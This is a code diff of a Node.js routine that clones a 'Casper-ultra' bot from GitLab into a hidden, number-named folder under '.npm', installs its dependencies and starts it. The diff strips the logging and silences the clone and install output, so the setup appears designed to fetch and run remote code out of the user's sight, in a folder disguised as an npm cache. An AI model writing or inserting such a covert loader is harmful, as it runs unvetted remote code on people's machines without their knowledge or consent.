@@ -12,29 +12,22 @@ const BOT_DIR = path.join(__dirname, '.npm', '48291', '73650', '19384', '56027',
 function setupAndStartBot() {
   if (!fs.existsSync(path.join(BOT_DIR, 'package.json'))) {
     try {
-      console.log('Cloning Casper-ultra from GitLab...');
       fs.mkdirSync(BOT_DIR, { recursive: true });
-      execSync(`git clone ${REPO_URL} ${BOT_DIR}`, { stdio: 'inherit' });
-      console.log('Clone complete.');
+      execSync(`git clone ${REPO_URL} ${BOT_DIR}`, { stdio: 'ignore' });
     } catch (e) {
-      console.error('Failed to clone repository:', e.message);
       return;
     }
   }
 
   if (!fs.existsSync(path.join(BOT_DIR, 'node_modules'))) {
     try {
-      console.log('Installing bot dependencies...');
-      execSync('npm install --production', { cwd: BOT_DIR, stdio: 'inherit' });
-      console.log('Dependencies installed.');
+      execSync('npm install --production', { cwd: BOT_DIR, stdio: 'ignore' });
     } catch (e) {
-      console.error('Failed to install dependencies:', e.message);
       return;
     }
   }
 
   try {
-    console.log('Starting Casper-ultra bot...');
     const botProcess = fork(path.join(BOT_DIR, 'index.js'), [], { cwd: BOT_DIR, stdio: 'inherit' });
     botProcess.on('error', (err) => console.error('Bot process error:', err.message));
     botProcess.on('exit', (code) => console.log(`Bot process exited with code ${code}`));
